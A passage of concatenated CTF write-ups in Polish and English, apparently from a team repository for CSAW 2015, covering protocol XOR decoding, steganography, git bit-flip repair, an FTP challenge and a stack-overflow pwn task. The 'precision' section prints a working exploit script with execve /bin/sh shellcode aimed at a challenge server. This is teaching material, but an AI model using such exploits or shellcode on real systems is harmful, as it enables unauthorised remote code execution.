68 bytes\n     - hash:  0\n     - magic1: 732\n     - conn_id:  1\n     - seq_id:  0\n     - unk2:  0\n     - calculated hash: f9e9\n     - rawdata:\n        00 25 f2 a9 8d 96 8a 8c 84 9c 87 8d c7 89 8d 9f\n        e9 f9 e9 f9 e9 f9 e9 f9 e9 f9 e9 f9 e9 f9 e9 f9\n        e9 f9 e9 f9 e9 f9 e9 f9 e9 f9 e9 f9 e9 f9 e9 f9\n        e9 f9 e9 f9 e9 f9 60 00\n    PACKET 1\n     - size: 68 bytes\n     - hash:  0\n     - magic1: 732\n     - conn_id:  1\n     - seq_id:  0\n     - unk2:  0\n     - calculated hash: f9e9\n     - rawdata:\n        00 00 28 a9 9a 98 84 89 85 9c c7 8d 80 9f e9 f9\n        e9 f9 e9 f9 e9 f9 e9 f9 e9 f9 e9 f9 e9 f9 e9 f9\n        e9 f9 e9 f9 e9 f9 e9 f9 e9 f9 e9 f9 e9 f9 e9 f9\n        e9 f9 e9 f9 e9 f9 60 00\n    PACKET 2\n     - size: 68 bytes\n     - hash:  0\n     - magic1: 732\n     - conn_id:  1\n     - seq_id:  0\n     - unk2:  0\n     - calculated hash: f9e9\n     - rawdata:\n        00 00 15 c1 86 8c 9d 9f 80 95 8c d7 8d 98 9d f9\n        e9 f9 e9 f9 e9 f9 e9 f9 e9 f9 e9 f9 e9 f9 e9 f9\n        e9 f9 e9 f9 e9 f9 e9 f9 e9 f9 e9 f9 e9 f9 e9 f9\n        e9 f9 e9 f9 e9 f9 60 00\n    (...)\n    PACKET 9\n     - size: 212 bytes\n     - hash: 4567\n     - magic1: 732\n     - conn_id: 1c\n     - seq_id:  0\n     - unk2:  0\n     - calculated hash: 3f50\n     - rawdata:\n        d9 6f 1e 78 5d 35 4a 35 50 3f 50 32 19 77 14 6d\n        50 3f 51 78 50 3f 50 28 58 39 50 3f 50 a7 e0 b2\n        78 3f 50 3f 56 5d 1b 78 14 3f af 3f af 3f af 9f\n        ed 98 c3 3f 50 2a 26 76 14 7e 04 47 cc d2 cd 48\n        08 6b 87 89 90 40 63 cb 51 79 0a 2b 4b 2d 33 ef\n        40 ce f9 7e ff 9d 32 1e 4a 34 16 9c 96 2d 1b b3\n        19 77 14 90 76 5d 28 7b d9 1a 01 cb 4a 5d d9 22\n        73 09 7c 67 ff 5d 47 b6 75 9f 72 fe 30 28 75 1d\n        70 ed 6b 7c 83 a6 a7 38 63 d8 5e 05 98 3f d3 da\n        0d 41 8f 08 8f d8 cc 06 ab a3 e5 08 2b 92 e3 c9\n        0a d4 3c 7a da 97 78 3a e5 9f e4 93 dc 2a 6b 48\n        e2 5f b3 79 a2 35 5b 86 46 23 1c e4 e7 e1 fa f2\n        75 d4 d4 d4 21 4e 68 b2\n     (...)\n\nCo się rzuca w oczy bardzo - powtarzający sie padding na początku (e9f9). Dalej, wiemy że dane to plik .png - pierwszy pakiet z danymi to packet 9 (domyślamy się tego, bo jest w odpowiedzi na drugi request od klienta, oraz ma troche inną strukture niż peirwsze pakiety - przypominające headery jakieś).\n\nWięc, kierowani intuicją, xorujemy pierwsze bajty pakietu 9 z nagłówkiem .png:\n\n    >>> ' d9 6f 1e 78 5d 35 4a 35 50 3f 50 32 19 77 14 6d'.replace(' ', '')\n    'd96f1e785d354a35503f50321977146d'\n    >>> ' d9 6f 1e 78 5d 35 4a 35 50 3f 50 32 19 77 14 6d'.replace(' ', '').decode('hex')\n    '\\xd9o\\x1ex]5J5P?P2\\x19w\\x14m'\n    >>> raw = ' d9 6f 1e 78 5d 35 4a 35 50 3f 50 32 19 77 14 6d'.replace(' ', '').decode('hex')\n    >>> png = '89504E470D0A1A0A0000000D49484452'.decode('hex')\n    >>> def xor(a, b):\n    ...     return ''.join(chr(ord(ac) ^ ord(bc)) for ac, bc in zip(a, b))\n    ...\n    >>> xor(raw, png)\n    'P?P?P?P?P?P?P?P?'\n    >>> xor(raw, png).encode('hex')\n    '503f503f503f503f503f503f503f503f'\n\nW tym momencie możemy uścisnąć sobie dłonie - praktycznie rozwiązaliśmy zadanie. Pozostaje pytanie, skąd bierze się liczba z którą xorujemy - nie jest to stała, niestety. Ale kierowani znowu intuicją, domyślamy się że 'padding' z pierwszych pakietów to xorowane null bajty (długość się zgadza).\n\nAle od czego zależy ta liczba? W pakiecie mamy ciekawą daną z której jeszcze nie skorzystaliśmy - oznaczoną w strukturze jako 'hash'. Kiedy ta liczba jest równa 0, xorujemy dane z e9f9. Kiedy ta liczba jest równa 4567 xorujemy z 503f. W jaki sposób może być wyprowadzany wynikowy hash? Zgadnijmy...:\n\n    >>> hex(0x503f + 0x4567)\n    '0x95a6'\n\nJest to proste dodawanie wartości w polu 'hash' oraz magicznej stałej. Zaiste silne szyfrowanie ;).\n\nPozostaje dopracować nasz parser, i mamy wynik:\n\n    msm@andromeda /cygdrive/c/Users/msm/Code/RE/CTF/2015-09-16 csaw/forensics_200_pcapin\n    $ ./a.exe -tc\n    PACKET 0\n     - size: 68 bytes\n     - hash:  0\n     - magic1: 732\n     - conn_id:  1\n     - seq_id:  0\n     - unk2:  0\n     - calculated hash: f9e9\n     - rawdata:\n        e9 dc 1b 50 64 6f 63 75 6d 65 6e 74 2e 70 64 66   ...Pdocument.pdf\n        00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................\n        00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................\n        00 00 00 00 00 00 89 f9                           ........\n    PACKET 1\n     - size: 68 bytes\n     - hash:  0\n     - magic1: 732\n     - conn_id:  1\n     - seq_id:  0\n     - unk2:  0\n     - calculated hash: f9e9\n     - rawdata:\n        e9 f9 c1 50 73 61 6d 70 6c 65 2e 74 69 66 00 00   ...Psample.tif..\n        00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................\n        00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................\n        00 00 00 00 00 00 89 f9                           ........\n    (...)\n    PACKET 9\n     - size: 212 bytes\n     - hash: 4567\n     - magic1: 732\n     - conn_id: 1c\n     - seq_id:  0\n     - unk2:  0\n     - calculated hash: 3f50\n     - rawdata:\n        89 50 4e 47 0d 0a 1a 0a 00 00 00 0d 49 48 44 52   .PNG........IHDR\n        00 00 01 47 00 00 00 17 08 06 00 00 00 98 b0 8d   ...G............\n        28 00 00 00 06 62 4b 47 44 00 ff 00 ff 00 ff a0   (....bKGD.......\n        bd a7 93 00 00 15 76 49 44 41 54 78 9c ed 9d 77   ......vIDATx...w\n        58 54 d7 b6 c0 7f 33 f4 01 46 5a 14 1b 12 63 d0   XT....3..FZ...c.\n        10 f1 a9 41 af a2 62 21 1a 0b 46 a3 c6 12 4b 8c   ...A..b!..F...K.\n        49 48 44 af 26 62 78 44 89 25 51 f4 1a 62 89 1d   IHD.&bxD.%Q..b..\n        23 36 2c 58 af 62 17 89 25 a0 22 c1 60 17 25 22   #6,X.b..%.\".`.%\"\n        20 d2 3b 43 d3 99 f7 07 33 e7 0e 3a c8 00 83 e5    .;C....3..:....\n        5d 7e df 37 df e7 9c 39 fb 9c b5 37 7b ad b3 f6   ]~.7...9...7{...\n        5a eb 6c 45 8a a8 28 05 b5 a0 b4 ac 8c 15 3b 77   Z.lE..(.......;w\n        b2 60 e3 46 f2 0a 0b b9 16 1c 4c db b7 de aa cd   .`.F......L.....\n        25 eb 84 eb 71 71 38 8d                           %...qq8.\n\nJak widać wszystkie dane z png zostały pięknie przeczytane. Pozostaje zapisać pakiety od 9 do końca w pliku i odczytać znajdujacy się tam [obrazek png](pcapin.png).\n\nZadanie rozwiązane.\n\nŹródła całego dekodera (nie wiem po co napisanego, skoro prawdopodobnie żaden program na świecie nie używa takiego formatu do komunikacji, ale lubimy pisać parsery) znajdują się w pliku [parser.c](parser.c)\n\n### ENG Version\n\n\nWe get [.pcap file](pcapin.pcap). There is only a single interesting tcp stream inside so we extract data from it (only those sent from server to the client, however it seems that the client was sending data using the same protocol) to [separate file](rawdata.bin).\n\nNow the protocol analysis starts. For example at the first glance we can notice a repeating data pattern `00440000073200010000000000` in the first part, and then some variations of `00D423C60732001C00010000`.\n\nWe will spare the reader the step-by-step analysis (since it was long and turbulent), but the key point was to notice that the data are paritioned into packets and first word of each one of them is the packet length. This was we can split the server response into packets and we can also see that a response ends with `END`.\n\nWith this knowledge we decode all packets in the sequence and using some guessing we end up with a structure as follows:\n\n    struct packet {\n        uint16_t length;\n        uint16_t hash;\n        uint16_t magic1;\n        uint16_t conn_id;\n        uint16_t seq_id;\n        uint16_t unk2;\n        uint8_t raw[10000];\n    };\n\nWe wrote a small tool for dumping the contents of packets with given structure:\t\n\n    msm@andromeda /cygdrive/c/Users/msm/Code/RE/CTF/2015-09-16 csaw/forensics_200_pcapin\n    $ ./a.exe\n    PACKET 0\n     - size: 68 bytes\n     - hash:  0\n     - magic1: 732\n     - conn_id:  1\n     - seq_id:  0\n     - unk2:  0\n     - calculated hash: f9e9\n     - rawdata:\n        00 25 f2 a9 8d 96 8a 8c 84 9c 87 8d c7 89 8d 9f\n        e9 f9 e9 f9 e9 f9 e9 f9 e9 f9 e9 f9 e9 f9 e9 f9\n        e9 f9 e9 f9 e9 f9 e9 f9 e9 f9 e9 f9 e9 f9 e9 f9\n        e9 f9 e9 f9 e9 f9 60 00\n    PACKET 1\n     - size: 68 bytes\n     - hash:  0\n     - magic1: 732\n     - conn_id:  1\n     - seq_id:  0\n     - unk2:  0\n     - calculated hash: f9e9\n     - rawdata:\n        00 00 28 a9 9a 98 84 89 85 9c c7 8d 80 9f e9 f9\n        e9 f9 e9 f9 e9 f9 e9 f9 e9 f9 e9 f9 e9 f9 e9 f9\n        e9 f9 e9 f9 e9 f9 e9 f9 e9 f9 e9 f9 e9 f9 e9 f9\n        e9 f9 e9 f9 e9 f9 60 00\n    PACKET 2\n     - size: 68 bytes\n     - hash:  0\n     - magic1: 732\n     - conn_id:  1\n     - seq_id:  0\n     - unk2:  0\n     - calculated hash: f9e9\n     - rawdata:\n        00 00 15 c1 86 8c 9d 9f 80 95 8c d7 8d 98 9d f9\n        e9 f9 e9 f9 e9 f9 e9 f9 e9 f9 e9 f9 e9 f9 e9 f9\n        e9 f9 e9 f9 e9 f9 e9 f9 e9 f9 e9 f9 e9 f9 e9 f9\n        e9 f9 e9 f9 e9 f9 60 00\n    (...)\n    PACKET 9\n     - size: 212 bytes\n     - hash: 4567\n     - magic1: 732\n     - conn_id: 1c\n     - seq_id:  0\n     - unk2:  0\n     - calculated hash: 3f50\n     - rawdata:\n        d9 6f 1e 78 5d 35 4a 35 50 3f 50 32 19 77 14 6d\n        50 3f 51 78 50 3f 50 28 58 39 50 3f 50 a7 e0 b2\n        78 3f 50 3f 56 5d 1b 78 14 3f af 3f af 3f af 9f\n        ed 98 c3 3f 50 2a 26 76 14 7e 04 47 cc d2 cd 48\n        08 6b 87 89 90 40 63 cb 51 79 0a 2b 4b 2d 33 ef\n        40 ce f9 7e ff 9d 32 1e 4a 34 16 9c 96 2d 1b b3\n        19 77 14 90 76 5d 28 7b d9 1a 01 cb 4a 5d d9 22\n        73 09 7c 67 ff 5d 47 b6 75 9f 72 fe 30 28 75 1d\n        70 ed 6b 7c 83 a6 a7 38 63 d8 5e 05 98 3f d3 da\n        0d 41 8f 08 8f d8 cc 06 ab a3 e5 08 2b 92 e3 c9\n        0a d4 3c 7a da 97 78 3a e5 9f e4 93 dc 2a 6b 48\n        e2 5f b3 79 a2 35 5b 86 46 23 1c e4 e7 e1 fa f2\n        75 d4 d4 d4 21 4e 68 b2\n     (...)\n\nWhat is very evident, there is a repeating padding in the beginning (e9f9). Next, we know that contents are a .png file - first data packet is the one with number 9 (we figure this out based on the fact that it comes after second request from user and has a slightly different structure than the rest of the packets - it looks as it contains some header)\n\nGuided by intuition we xor first bytes from packet 9 with .png file header:\n\n    >>> ' d9 6f 1e 78 5d 35 4a 35 50 3f 50 32 19 77 14 6d'.replace(' ', '')\n    'd96f1e785d354a35503f50321977146d'\n    >>> ' d9 6f 1e 78 5d 35 4a 35 50 3f 50 32 19 77 14 6d'.replace(' ', '').decode('hex')\n    '\\xd9o\\x1ex]5J5P?P2\\x19w\\x14m'\n    >>> raw = ' d9 6f 1e 78 5d 35 4a 35 50 3f 50 32 19 77 14 6d'.replace(' ', '').decode('hex')\n    >>> png = '89504E470D0A1A0A0000000D49484452'.decode('hex')\n    >>> def xor(a, b):\n    ...     return ''.join(chr(ord(ac) ^ ord(bc)) for ac, bc in zip(a, b))\n    ...\n    >>> xor(raw, png)\n    'P?P?P?P?P?P?P?P?'\n    >>> xor(raw, png).encode('hex')\n    '503f503f503f503f503f503f503f503f'\n\nAt this point we can all shake hands - we basically solved the task. The only question is where does the number we use for XOR comes from - it's not a constant unfortunately. But still guided by intuition we guess that the 'padding' from the first packets are xored null bytes (length is matching).\n\nBut what does this number depends on? In the packet there is still data we haven't used - we marked it as 'hash' in the structure. When this number is equal to 0 we xor data with e9f9. When it's equal to 4567 we xor with 503f. How can we devise the hash value? Let's guess...:\n\n    >>> hex(0x503f + 0x4567)\n    '0x95a6'\n\nIt's a simple addition of the 'hash' field value and a magic constant. A strong cipher indeed ;).\n\nThe only thing left is to work a little bit on the parser and we have the result:\n\n    msm@andromeda /cygdrive/c/Users/msm/Code/RE/CTF/2015-09-16 csaw/forensics_200_pcapin\n    $ ./a.exe -tc\n    PACKET 0\n     - size: 68 bytes\n     - hash:  0\n     - magic1: 732\n     - conn_id:  1\n     - seq_id:  0\n     - unk2:  0\n     - calculated hash: f9e9\n     - rawdata:\n        e9 dc 1b 50 64 6f 63 75 6d 65 6e 74 2e 70 64 66   ...Pdocument.pdf\n        00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................\n        00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................\n        00 00 00 00 00 00 89 f9                           ........\n    PACKET 1\n     - size: 68 bytes\n     - hash:  0\n     - magic1: 732\n     - conn_id:  1\n     - seq_id:  0\n     - unk2:  0\n     - calculated hash: f9e9\n     - rawdata:\n        e9 f9 c1 50 73 61 6d 70 6c 65 2e 74 69 66 00 00   ...Psample.tif..\n        00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................\n        00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................\n        00 00 00 00 00 00 89 f9                           ........\n    (...)\n    PACKET 9\n     - size: 212 bytes\n     - hash: 4567\n     - magic1: 732\n     - conn_id: 1c\n     - seq_id:  0\n     - unk2:  0\n     - calculated hash: 3f50\n     - rawdata:\n        89 50 4e 47 0d 0a 1a 0a 00 00 00 0d 49 48 44 52   .PNG........IHDR\n        00 00 01 47 00 00 00 17 08 06 00 00 00 98 b0 8d   ...G............\n        28 00 00 00 06 62 4b 47 44 00 ff 00 ff 00 ff a0   (....bKGD.......\n        bd a7 93 00 00 15 76 49 44 41 54 78 9c ed 9d 77   ......vIDATx...w\n        58 54 d7 b6 c0 7f 33 f4 01 46 5a 14 1b 12 63 d0   XT....3..FZ...c.\n        10 f1 a9 41 af a2 62 21 1a 0b 46 a3 c6 12 4b 8c   ...A..b!..F...K.\n        49 48 44 af 26 62 78 44 89 25 51 f4 1a 62 89 1d   IHD.&bxD.%Q..b..\n        23 36 2c 58 af 62 17 89 25 a0 22 c1 60 17 25 22   #6,X.b..%.\".`.%\"\n        20 d2 3b 43 d3 99 f7 07 33 e7 0e 3a c8 00 83 e5    .;C....3..:....\n        5d 7e df 37 df e7 9c 39 fb 9c b5 37 7b ad b3 f6   ]~.7...9...7{...\n        5a eb 6c 45 8a a8 28 05 b5 a0 b4 ac 8c 15 3b 77   Z.lE..(.......;w\n        b2 60 e3 46 f2 0a 0b b9 16 1c 4c db b7 de aa cd   .`.F......L.....\n        25 eb 84 eb 71 71 38 8d                           %...qq8.\n\nAs we can see all the data from png files were read correctly. Now we only need to save the packets from 9 until end of fie and read the result [png picture](pcapin.png).\n\nTask solved.\n\nSource codes of the decoder (we're not really sure why we actually spent time on this, since most likely there is no software that uses this format, but some of us like to write parsers) are in the [parser.c](parser.c)", "timestamp": "2025-10-21T22:02:59.401542"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-09-16-csaw/forensics_200_airport/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-09-16-csaw/forensics_200_airport/README.md", "content": "##Airport (forensics, 200p)\n\n\n##PL version\n`for ENG version scroll down`\n\nDostajemy folder z czteroma nieoznaczonymi zdjęciami lotnisk i następującym pngem:\n![](steghide.jpg)\n>Steghide is a steganography program that is able to hide data in various kinds of image- and audio-files.\n\nPróbujemy uruchomić program na jpgu (na pngach niczego nie wykrywa) i dostajemy zapytanie o hasło.\n\nWarto byłoby dowiedzieć się, co to za lotniska, używając google images dostajemy taką oto listę:\n  * José Martí International Airport\n  * Hong Kong International Airport\n  * Los Angeles International Airport\n  * Toronto Pearson International Airport\n\nJak możnaby je połączyć w jedną całość? A na przykłąd używając kodów lotnisk :)\n\nOdpalamy program i jako hasło wklepujemy `HAVHKGLAXYYZ`, dostajemy flagę iH4t3A1rp0rt5\n\n#ENG version\n\nWe are give a folder with four undescribed airport photos and an icon:\n\n![](steghide.jpg)\n\n>Steghide is a steganography program that is able to hide data in various kinds of image- and audio-files.\n\nWe try to run steghide on the jpg file (png returns no results) but we are asked for a password.\n\nIt's time we found out what theese airport are, using google images we get following list:\n  * José Martí International Airport\n  * Hong Kong International Airport\n  * Los Angeles International Airport\n  * Toronto Pearson International Airport\n\nHow can we merge them into a password? Let's try airport codes!\n\nWe run steghide again and this time input `HAVHKGLAXYYZ`, the program runs for some time and returns iH4t3A1rp0rt5, hooray!\n", "timestamp": "2025-10-21T22:02:59.664625"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-09-16-csaw/forensics_400_sharpturn/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-09-16-csaw/forensics_400_sharpturn/README.md", "content": "## sharpturn (forensics, 400p, 110 solves)\n\n> I think my SATA controller is dying.\n> \n> sharpturn.tar.xz-46753a684d909244e7d916cfb5271a95\n\n### PL Version\n`for ENG version scroll down`\n\nDostajemy zip z czymś co może być tylko zawartością folderu `.git`. Wypakowywujemy więc sobie z niego dane (zrobiliśmy to za pomocą pythona, import zlib i zlib.decompress, ale po zastanowieniu w sumie wystarczyłby pewnie git checkout ;) ).\n\nPo chwili zauważamy że coś się nie zgadza - hash pliku sharp.cpp jest inny niż powinien. Patrzymy więc na rewizje po kolei - [rewizja pierwsza](sharp_v1_efda_efda) ma dobry hash. [Rewizja druga](sharp_v2_354e_8675)... już nie. Napisaliśmy więc [sprytny skrypt w pythonie](flipuj.py), flipujący losowe bity (domyślamy się że o to chodzi, skoro w treści zadania jest coś o umierającym kontrolerze SATA) i próbujący odkryć te które sie nie zgadzają.\n\nW ten sposób dochodzimy do [poprawnej wersji rewizji drugiej](sharp_v2_354e_354e). Niestety hash [rewizji trzeciej](sharp_v3_d961_7564) również się nie zgadza, ale poprawiamy i jego naszym bitflipperem i mamy [poprawną rewizję trzecią](sharp_v3_d961_7564). I to samo robimy przy czwartej - [plik ze złym hashem](sharp_v4_f8d0_8096) zamieniamy na [plik z dobrym hashem](sharp_v4_f8d0_f8d0).\n\nW tym momencie mamy wszystko czego potrzebujemy - faktoryzujemy sobie jeszcze liczbę jak wymaga program, i idziemy:\n\n    Part1: Enter flag:\n    flag\n    Part2: Input 31337:\n    31337\n    Part3: Watch this: https://www.youtube.com/watch?v=PBwAxmrE194\n    ok\n    Part4: C.R.E.A.M. Get da _____:\n    money\n    Part5: Input the two prime factors of the number 272031727027.\n    31357 8675311\n    flag{3b532e0a187006879d262141e16fa5f05f2e6752} \n\n(Warto zauważyć poczucie humoru autorów zadania, gdzie \"enter flag\" wymaga podania dosłownie \"flag\").\n\nFlaga którą otrzymujemy jest przyjmowana przez system, więc jesteśmy kolejne 400 punktów do przodu.\n\n### ENG Version\n\nWe get a zip file with something that can only be the contents of `.git` directory. We extract the data (we did this with python, import zlib and zlib.decompress, but most likely we could have simply used git checkout ;) ).\n\nAfter a while we realise that something is wrong - hash of sharp.cpp file is incorrect. We check the sequence of revisions one by one - [first revision](sharp_v1_efda_efda) has a correct hash. [Second revision](sharp_v2_354e_8675)... does not. We wrote a [clever python script](flipuj.py) which flips random bits (we guess that this is the case, since the task decription mentions a broken SATA controller) and tries to figure out which are incorrect.\n\nThis was we finally get to [correct version of second revision](sharp_v2_354e_354e). Unfortunately, hash of the [third revision](sharp_v3_d961_7564) is also incorrect, but we fix it with our bitflipper and we get a [correct third revision](sharp_v3_d961_7564). We do the same with fourth revision - [file with incorrect hash](sharp_v4_f8d0_8096) we turn into [file with correct hash](sharp_v4_f8d0_f8d0).\n\nNow we have almost everything we need - we also need to factor a given number, and we proceed:\n\n    Part1: Enter flag:\n    flag\n    Part2: Input 31337:\n    31337\n    Part3: Watch this: https://www.youtube.com/watch?v=PBwAxmrE194\n    ok\n    Part4: C.R.E.A.M. Get da _____:\n    money\n    Part5: Input the two prime factors of the number 272031727027.\n    31357 8675311\n    flag{3b532e0a187006879d262141e16fa5f05f2e6752} \n\n(Author's sense of humour is worth noting here - we were supposed to put \"flag\" string as an answer for a prompt \"enter flag\").\nThe flag we get is accepted so we are 400 points up.\n", "timestamp": "2025-10-21T22:02:59.942086"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-09-16-csaw/pwn_100_precision/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-09-16-csaw/pwn_100_precision/README.md", "content": "## precision (pwn, 100p, 272 solves)\n\n### PL\n[ENG](#eng-version)\n\n> nc 54.173.98.115 1259  \n> [precision_a8f6f0590c177948fe06c76a1831e650](precision)\n\nPobieramy udostępnioną binarkę i na początek sprawdzamy jakie utrudnienia przygotowali nam autorzy.\n\n```\n# checksec.sh --file precision\nRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE\nPartial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   precision\n```\nWidać, że nieduże ;).\n\nKrótka analiza w IDA pokazuje nam, że program:\n1. Realizuje własną wariację stack guard (dla małego utrudnienia jako liczbę zmiennoprzecinkową).\n2. Wypisuje adres bufora oraz za pomocą `scanf` pobiera do niego od nas dane (za pomocą specyfikatora `%s` nieograniczającego wielkość).\n3. Sprawdza wartość cookie/canary, wypisuje nasz bufor i wychodzi za pomocą zwykłego `ret`.\n\nMamy więc do czynienia z prostym buffer overflow z umieszczeniem shellcode'u na stosie (brak NX oraz podany adres bufora).\n\n```python\nimport socket\n\ns = socket.socket()\ns.connect(('54.173.98.115', 1259))\n\nbuf_addr = s.recv(17)[8:16]\n\ns.send('31c0b03001c430c050682f2f7368682f62696e89e389c1b0b0c0e804cd80c0e803cd80'.decode('hex').ljust(128, 'a')) # shellcode: execve /bin/sh\ns.send('a5315a4755155040'.decode('hex')) # stack guard\ns.send('aaaaaaaaaaaa') # padding\ns.send(buf_addr.decode('hex')[::-1]) # ret: buffer address\ns.send('\\n')\nprint (s.recv(9999))\ns.send('cat flag\\n')\nprint (s.recv(9999))\ns.close()\n```\n\nOraz wynik:\n\n`flag{1_533_y0u_kn0w_y0ur_w4y_4r0und_4_buff3r}`\n\n### ENG version\n\n> nc 54.173.98.115 1259  \n> [precision_a8f6f0590c177948fe06c76a1831e650](precision)\n\nWe download the binary and start with checking what kind of obstacles were prepared:\n\n```\n# checksec.sh --file precision\nRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE\nPartial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   precision\n```\nAs can be seen, not much ;).\n\nShort analysis in IDA shows us that the binary:\n1. Implements a custom stack guard (to make it a little bit harder, as s floating point number).\n2. Prints the buffer address and uses `scanf` to read input data (with `%s` without limiting the size of input)\n3. Checks the value of canary, prints the buffer and exits with `ret`.\n\nTherefore, we are dealing with a simplem buffer overflow with placing shellcode on the stack (no NX and explicitly printed out buffer address).\nThe exploit:\n\n```python\nimport socket\n\ns = socket.socket()\ns.connect(('54.173.98.115', 1259))\n\nbuf_addr = s.recv(17)[8:16]\n\ns.send('31c0b03001c430c050682f2f7368682f62696e89e389c1b0b0c0e804cd80c0e803cd80'.decode('hex').ljust(128, 'a')) # shellcode: execve /bin/sh\ns.send('a5315a4755155040'.decode('hex')) # stack guard\ns.send('aaaaaaaaaaaa') # padding\ns.send(buf_addr.decode('hex')[::-1]) # ret: buffer address\ns.send('\\n')\nprint (s.recv(9999))\ns.send('cat flag\\n')\nprint (s.recv(9999))\ns.close()\n```\n\nAnd the result:\n\n`flag{1_533_y0u_kn0w_y0ur_w4y_4r0und_4_buff3r}`", "timestamp": "2025-10-21T22:03:00.202444"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-09-16-csaw/pwn_300_ftp2/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-09-16-csaw/pwn_300_ftp2/README.md", "content": "## FTP2 (pwn, 300p, ? solves)\n\n### PL\n[ENG](#eng-version)\n\n> nc 54.172.10.117 12012\n> [ftp_0319deb1c1c033af28613c57da686aa7](ftp)\n\nPobieramy zalinkowany plik i ładujemy do IDY. Jest to faktycznie, zgodnie z opisem, serwer FTP - ten sam co w zadaniu FTP (re 300).\n\nWiemy że flaga znajduje się gdzieś na serwerze. Mamy też username i hasło.\n\nSpróbowaliśmy najpierw dorwać się do serwera FTP w cywilizowany sposób - po prostu łącząc się klientem FTP. Niestety, nie wyszło (ani filezilla, ani webowe klienty nie dały rady - jednak widać ten serwer FTP nie był tak kompatybilny jak moglibyśmy liczyć).\n\nNapisaliśmy więc trywialnego klienta FTP, łączącego się z serwerem:\n\nclient.py:\n```\nimport socket\nimport subprocess\n\nHOST = '54.175.183.202' \ns = socket.socket()\ns.connect((HOST, 12012))\n\ndef send(t):\n    print t\n    s.send(t)\n\ndef recv():\n    msg = s.recv(9999)\n    print msg\n    return msg\n\nrecv()\nsend('USER blankwall\\n')\nrecv()\nsend('PASS TkCWRy')\nrecv()\nrecv()\n\nwhile True:\n    print \">>\",\n    i = raw_input() + '\\n'\n    send(i)\n    msg = recv()\n    if 'PASV succesful' in msg:\n        port = int(msg.split()[-1])\n        print port\n        subprocess.Popen(['python', 'process.py', str(port)])\n```\n\nprocess.py:\n```\nimport socket\nimport sys\n\nHOST = '54.175.183.202' \n\nport = int(sys.argv[1])\nt = socket.socket()\nt.connect((HOST, port))\nprint t.recv(99999999)\n```\n\nI tutaj zdarzyła się dziwna rzecz - wylistowaliśmy katalog po połączeniu się (poleceniem LIST), i widzimy plik o nazwie \"flag\" w cwd.\n\nNastępnie wykonaliśmy polecenie RETR, żeby pobrać ten plik. I... dostaliśmy flagę:\n\n`flag{exploiting_ftp_servers_in_2015}`\n\nByło to bardzo niespodziewane, i albo to jakiś błąd autorów zadania, albo ktoś wyexploitował zadanie \"po bożemu\" i (nieświadomie?) zostawił flagę w pliku na serwerze czytalnym dla każdego.\n\nTak czy inaczej, tanie 300 punktów do przodu.\n\n### ENG version\n\n> nc 54.172.10.117 12012\n> [ftp_0319deb1c1c033af28613c57da686aa7](ftp)\n\nW download the binary and load it into IDA. It is in fact a FTP server - the same as in the task FTP (re 300).\n\nWe know that the flag is somewhere on the server. We also have already the username and password.\n\nWe tried to connect to the server with an actual FTP client. Unfortunately it didn't work (neither filezilla nor any web clients could do it - apparently this FTP server was not as standard as we hoped).\n\nTherefore we made a trivial FTOP client for the connection:\n\nclient.py:\n```\nimport socket\nimport subprocess\n\nHOST = '54.175.183.202' \ns = socket.socket()\ns.connect((HOST, 12012))\n\ndef send(t):\n    print t\n    s.send(t)\n\ndef recv():\n    msg = s.recv(9999)\n    print msg\n    return msg\n\nrecv()\nsend('USER blankwall\\n')\nrecv()\nsend('PASS TkCWRy')\nrecv()\nrecv()\n\nwhile True:\n    print \">>\",\n    i = raw_input() + '\\n'\n    send(i)\n    msg = recv()\n    if 'PASV succesful' in msg:\n        port = int(msg.split()[-1])\n        print port\n        subprocess.Popen(['python', 'process.py', str(port)])\n```\n\nprocess.py:\n```\nimport socket\nimport sys\n\nHOST = '54.175.183.202' \n\nport = int(sys.argv[1])\nt = socket.socket()\nt.connect((HOST, port))\nprint t.recv(99999999)\n```\n\nAnd here we stumbled upon a strange thing - we listed the directory (with LIST) and we saw and we saw `flag` file in CWD.\n\nThen we used RETR command to download this file and... we got the flag:\n\n`flag{exploiting_ftp_servers_in_2015}`\n\nIt was rather unexpected and either this was some kind of mistake from the challenge authors or someone simply solved the task the \"right way\" and (unknowingly) left the flag on the server.\n\nEither way we got a cheap 300 points.", "timestamp": "2025-10-21T22:03:00.453388"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-09-16-csaw/pwn_500_rhinoxorus/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-09-16-csaw/pwn_500_rhinoxorus/README.md", "content": "## rhinoxorus (pwn, 500p, ? solves)\n\nDostajemy program i analizujemy go. Po uruchomieniu wczytuje on zawartość pliku password.txt do zmiennej globalnej, i zaczyna nasłuchiwać na porcie 24242 i forkuje się dla każdego połączenia.\n\nKażdy fork wczytuje 256 bajtów od usera i wywołuje jakąś funkcję z globalnej tablicy funkcji:\n\n```\nbytes_read = recv(sockfd, recv_buf, (unsigned int)BUF_SIZE, 0);\nif (bytes_read > 0)\n    func_array[recv_buf[0]](recv_buf, (unsigned int)bytes_read);\n```\n\nKażda z funkcji jest podobna, i wygląda mniej więcej tak:\n\n```\nunsigned char func_32(unsigned char *buf, unsigned int count)\n{\n    unsigned int i;\n    unsigned char localbuf[0x84]; // stała 0x84 jest różna dla każdej funkcji w tablicy\n    unsigned char byte=0x84; // stała 0x84 jest różna dla każdej funkcji w tablicy\n\n    memset(localbuf, byte, sizeof(localbuf));\n    printf(\"in function func_32, count is %u, bufsize is 